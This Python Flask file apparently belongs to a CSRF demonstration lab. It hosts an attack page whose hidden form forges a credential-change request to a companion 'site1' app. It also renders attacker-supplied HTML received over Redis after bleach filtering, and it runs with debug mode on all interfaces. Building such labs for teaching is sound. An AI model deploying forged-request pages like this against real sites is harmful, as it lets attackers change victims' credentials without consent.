from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import bleach
import redis
import os


attack_html = None
default_attack_html = '''
<form action="http://site1:5001/change_credentials" method="post">
    <input type="hidden" name="username" value="Hola">
    <input type="hidden" name="password" value="password">
    <button type="submit" name="submit">Button</button>
</form>
'''

app = Flask(__name__)
CORS(app, origins=['http://localhost:5000'])

redis_client = redis.StrictRedis.from_url(os.getenv('REDIS_URL'))
pubsub = redis_client.pubsub()


#CSRF Attack site
@app.route('/')
def index():
    global attack_html
    if attack_html == None:
        return render_template('app.html', attack_html=default_attack_html)
    else:
        html = attack_html
        attack_html = None
        return render_template('app.html',attack_html=html)


#HTML of the site
# @app.route('/html', methods=['POST'])
def get_html(html):
    global attack_html
    # attack_html_temp = request.json.get('html-input')
    attack_html_temp = html['data'].decode('utf-8')
    attack_html, cleaned = sanitize_html(attack_html_temp)       

    return

#Sanitization of the HTML
def sanitize_html(vulnerable_html):
    #Minimum tags needed
    allowed_tags = [
        'form',
        'input',
        'button'
    ]

    #Minimum attributes needed per tag
    allowed_attributes = {
        '*': ['action', 'method'],
        'input': ['type', 'name', 'value'],
        'button': ['type', 'name']
    }

    sanitized_html = bleach.clean(
        vulnerable_html,
        tags=allowed_tags,
        attributes=allowed_attributes,
        strip=True
    )

    return sanitized_html, (sanitize_html != vulnerable_html)

pubsub.subscribe(**{'data-channel': get_html})
pubsub.run_in_thread(sleep_time=2)

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True, port=5002)